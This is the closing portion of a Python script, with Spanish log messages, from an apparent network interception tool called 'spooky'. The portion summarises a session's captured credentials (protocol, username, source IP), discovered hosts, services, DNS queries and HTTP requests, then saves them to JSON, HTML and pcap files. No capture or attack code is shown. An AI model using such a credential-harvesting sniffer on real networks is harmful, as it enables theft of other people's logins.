                    log(f"[⚠️] Patrones sospechosos detectados: {len(analysis['suspicious_patterns'])}")
        
        # Session summary
        duration = datetime.now() - session_data.get('start_time', datetime.now())
        log(f"[*] Resumen de sesión:")
        log(f"    Duración: {str(duration).split('.')[0]}")
        log(f"    Credenciales capturadas: {len(session_data.get('credentials', []))}")
        log(f"    Hosts descubiertos: {len(session_data.get('hosts_discovered', set()))}")
        log(f"    Servicios detectados: {len(session_data.get('services_detected', {}))}")
        log(f"    Consultas DNS: {len(session_data.get('dns_queries', []))}")
        log(f"    Peticiones HTTP: {len(session_data.get('http_requests', []))}")
        
        if session_data.get('credentials'):
            log(f"[🔑] Credenciales encontradas:")
            for i, cred in enumerate(session_data['credentials'][:5], 1):  # Show first 5
                log(f"    {i}. {cred['protocol']}: {cred['username']} ({cred['source_ip']})")
            
            if len(session_data['credentials']) > 5:
                log(f"    ... y {len(session_data['credentials'])-5} más (ver reporte completo)")
        
        # Save session data as JSON
        try:
            # Convert sets to lists for JSON serialization
            session_copy = session_data.copy()
            session_copy['hosts_discovered'] = list(session_copy.get('hosts_discovered', set()))
            
            with open('spooky_session.json', 'w') as f:
                json.dump(session_copy, f, indent=2, default=str)
            log("[*] Datos de sesión guardados en spooky_session.json")
        except Exception as e:
            log(f"[!] Error guardando datos de sesión: {e}")
        
        log("[*] Proceso finalizado. Revisa los archivos generados:")
        log("    - spooky_report.html (reporte visual)")
        log("    - spooky_session.json (datos en JSON)")
        log(f"    - {opts.get('pcap', 'spooky.pcap')} (captura de red)")
        
    except Exception as e:
        log(f"[!] Error en cleanup: {e}")

if __name__ == "__main__":
    main()
